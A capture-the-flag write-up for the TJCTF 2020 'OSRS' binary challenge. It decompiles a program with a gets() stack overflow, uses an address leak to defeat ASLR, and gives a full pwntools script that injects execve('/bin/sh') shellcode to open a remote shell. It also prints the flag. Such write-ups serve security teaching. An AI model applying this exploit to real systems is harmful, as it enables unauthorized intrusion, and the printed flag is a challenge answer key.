# OSRS

> My friend keeps talking about Old School RuneScape. He says he made a
> service to tell you about trees.  
>  
> I don't know what any of this means but this system sure looks old! It has
> like zero security features enabled...  
>  
> nc p1.tjctf.org 8006

## Description

Let's decompile the binary with Ghidra.

```c  
undefined4 main(void)  
{  
 int iVar1;  
  
 setbuf(stdout,(char *)0x0);  
 setbuf(stdin,(char *)0x0);  
 setbuf(stderr,(char *)0x0);  
 iVar1 = get_tree();  
 if (0 < iVar1) {  
   puts(*(char **)(trees + iVar1 * 8 + 4));  
 }  
 return 0;  
}

int get_tree(void)  
{  
 int iVar1;  
 char local_110 [256];  
 int local_10;  
  
 puts("Enter a tree type: ");  
 gets(local_110);  
 local_10 = 0;  
 while( true ) {  
   if (0xc < local_10) {  
     printf("I don\'t have the tree %d :(\n",local_110);  
     return 0xffffffff;  
   }  
   iVar1 = strcasecmp(*(char **)(trees + local_10 * 8),local_110);  
   if (iVar1 == 0) break;  
   local_10 = local_10 + 1;  
 }  
 return local_10;  
}  
```

In the `get_tree` function, we see a potential buffer overflow enabled by the
function `gets`.

## Solution

As the description suggests, there is no security feature activated, including
no PIE or NX. Therefore we can include a shellcode in the buffer and execute
it.

However ASLR seems to be enabled. Thanksfully, the line `I don't have the
tree` leaks the address of the buffer, so we can retrieve it, jump again to
the `get_tree` function and perform our exploit, this time knowing the address
of the buffer.

```python  
from pwn import *

sh = remote('p1.tjctf.org', 8006)

ret_addr = 0x08048642  
get_tree_addr = 0x08048612  
offset = 256 + 16 # number of bytes from buffer to ret addr  
shellcode = asm(shellcraft.i386.linux.execve('/bin/sh'))

# First step: get address of buffer  
print(sh.recvuntil("type:").decode())

payload = b'a'*offset + p32(get_tree_addr)  
sh.sendline(payload)

print(sh.recvuntil("tree").decode(), end="")  
answer = sh.recvuntil(":(").decode()  
print(answer)

buf_addr = (int(answer.split(":(")[0])) & ((1 << 32) - 1)  
print(hex(buf_addr))

# Second step: insert shell code and jump there  
print(sh.recvuntil("type:").decode())  
payload = shellcode + b'\x00'*(offset - len(shellcode)) + p32(buf_addr) +
p32(0)

sh.sendline(payload)  
sh.interactive()  
```

Flag: `tjctf{tr33_c0de_in_my_she115}`

Original writeup (https://github.com/apoirrier/CTFs-
writeups/blob/master/TJCTF2020/Pwn/OSRS.md).